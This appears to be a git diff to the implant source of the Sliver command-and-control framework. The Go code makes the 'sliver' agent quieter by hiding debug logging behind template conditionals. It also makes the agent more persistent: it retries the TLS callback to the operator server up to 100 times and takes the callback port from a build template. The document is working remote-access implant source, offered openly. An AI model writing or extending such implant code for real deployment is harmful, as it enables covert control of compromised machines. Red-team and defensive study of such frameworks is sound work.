@@ -8,10 +8,15 @@ import (
 	"flag"
 	"fmt"
 	"io"
+
+	// {{if .Debug}}
 	"log"
+	// {{end}}
+
 	"os"
 	"os/user"
 	"runtime"
+	"strconv"
 	"time"
 
 	pb "sliver/protobuf"
@@ -25,30 +30,54 @@ const (
 	certPEM    = `{{.Cert}}`
 	caCertPEM  = `{{.CACert}}`
 
-	defaultServerIP    = `{{.DefaultServer}}`
-	defaultServerLport = 8888
+	defaultServerIP = `{{.DefaultServer}}`
 
 	timeout        = 30 * time.Second
 	readBufSize    = 64 * 1024 // 64kb
 	zeroReadsLimit = 10
+
+	maxErrors = 100
 )
 
 var (
 	server *string
 	lport  *int
+
+	defaultServerLport = getDefaultServerLport()
 )
 
 func main() {
 
+	// {{if .Debug}}
 	log.SetFlags(log.LstdFlags | log.Lshortfile)
+	// {{end}}
 
 	server = flag.String("server", defaultServerIP, "server address")
 	lport = flag.Int("lport", defaultServerLport, "server listen port")
 	flag.Parse()
 
+	// {{if .Debug}}
 	log.Printf("Hello my name is %s", sliverName)
+	// {{end}}
+
+	connectionErrors := 0
+	for connectionErrors < maxErrors {
+		err := start()
+		if err != nil {
+			connectionErrors++
+		}
+		time.Sleep(30 * time.Second)
+	}
+}
+
+func start() error {
+	// {{if .Debug}}
 	log.Printf("Connecting -> %s:%d", *server, uint16(*lport))
-	conn := tlsConnect(*server, uint16(*lport))
+	// {{end}}
+	conn, err := tlsConnect(*server, uint16(*lport))
+	if err != nil {
+		return err
+	}
 	defer conn.Close()
 	registerSliver(conn)
 
@@ -67,10 +96,13 @@ func main() {
 			break
 		}
 		if err == nil {
-			handler := handlers[envelope.Type]
-			go handler.(func(chan pb.Envelope, []byte))(send, envelope.Data)
+			if handler, ok := handlers[envelope.Type]; ok {
+				go handler.(func(chan pb.Envelope, []byte))(send, envelope.Data)
+			}
 		}
 	}
+
+	return nil
 }
 
 func registerSliver(conn *tls.Conn) {
@@ -98,7 +130,9 @@ func registerSliver(conn *tls.Conn) {
 func socketWriteEnvelope(connection *tls.Conn, envelope pb.Envelope) error {
 	data, err := proto.Marshal(&envelope)
 	if err != nil {
+		// {{if .Debug}}
 		log.Print("Envelope marshaling error: ", err)
+		// {{end}}
 		return err
 	}
 	dataLengthBuf := new(bytes.Buffer)
@@ -113,7 +147,9 @@ func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
 	dataLengthBuf := make([]byte, 4) // Size of uint32
 	_, err := connection.Read(dataLengthBuf)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Socket error (read msg-length): %v\n", err)
+		// {{end}}
 		return pb.Envelope{}, err
 	}
 	dataLength := int(binary.LittleEndian.Uint32(dataLengthBuf))
@@ -130,7 +166,9 @@ func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
 			break
 		}
 		if err != nil {
+			// {{if .Debug}}
 			log.Printf("Read error: %s\n", err)
+			// {{end}}
 			break
 		}
 	}
@@ -139,7 +177,9 @@ func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
 	envelope := &pb.Envelope{}
 	err = proto.Unmarshal(dataBuf, envelope)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Unmarshaling envelope error: %v", err)
+		// {{end}}
 		return pb.Envelope{}, err
 	}
 
@@ -147,21 +187,25 @@ func socketReadEnvelope(connection *tls.Conn) (pb.Envelope, error) {
 }
 
 // tlsConnect - Get a TLS connection or die trying
-func tlsConnect(address string, port uint16) *tls.Conn {
+func tlsConnect(address string, port uint16) (*tls.Conn, error) {
 	tlsConfig := getTLSConfig()
 	connection, err := tls.Dial("tcp", fmt.Sprintf("%s:%d", address, port), tlsConfig)
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Unable to connect: %v", err)
-		os.Exit(4)
+		// {{end}}
+		return nil, err
 	}
-	return connection
+	return connection, nil
 }
 
 func getTLSConfig() *tls.Config {
 
 	certPEM, err := tls.X509KeyPair([]byte(certPEM), []byte(keyPEM))
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Cannot load sliver certificate: %v", err)
+		// {{end}}
 		os.Exit(5)
 	}
 
@@ -189,13 +233,17 @@ func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error
 	roots := x509.NewCertPool()
 	ok := roots.AppendCertsFromPEM([]byte(caCertPEM))
 	if !ok {
+		// {{if .Debug}}
 		log.Printf("Failed to parse root certificate")
+		// {{end}}
 		os.Exit(3)
 	}
 
 	cert, err := x509.ParseCertificate(rawCerts[0]) // We should only get one cert
 	if err != nil {
+		// {{if .Debug}}
 		log.Printf("Failed to parse certificate: " + err.Error())
+		// {{end}}
 		return err
 	}
 
@@ -206,9 +254,19 @@ func rootOnlyVerifyCertificate(rawCerts [][]byte, _ [][]*x509.Certificate) error
 		Roots: roots,
 	}
 	if _, err := cert.Verify(options); err != nil {
+		// {{if .Debug}}
 		log.Printf("Failed to verify certificate: " + err.Error())
+		// {{end}}
 		return err
 	}
 
 	return nil
+}
+
+func getDefaultServerLport() int {
+	lport, err := strconv.Atoi(`{{.DefaultServerLPort}}`)
+	if err != nil {
+		return 8888
+	}
+	return lport
 }
